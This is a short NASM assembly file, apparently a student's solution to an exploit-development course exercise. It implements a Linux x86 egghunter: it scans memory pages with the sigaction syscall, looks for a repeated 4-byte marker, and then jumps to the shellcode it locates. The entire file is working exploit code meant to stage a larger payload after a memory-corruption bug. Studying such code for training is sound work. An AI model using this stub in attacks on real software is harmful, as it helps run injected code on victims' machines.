;Filename: sigaction-egghunter.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 3

global _start

section .text

_start:

setup:
	or cx, 0xfff		;Increase by page_size
next_address:
	inc ecx
	push byte 0x43		;Systemcall for sigation
	pop eax
	int 0x80
	cmp al, 0xf2		;f2 = invalid address
	jz setup
	
	mov eax, 0x726F6F74	;EGG = root = 726F6F74
	mov edi, ecx		;move address to edi to examine
	scasd			;check eax == edi, edi = edi+4
	jnz next_address
	scasd			;check eax == edi, edi = edi+4
	jnz next_address
	jmp edi			;execute shellcode

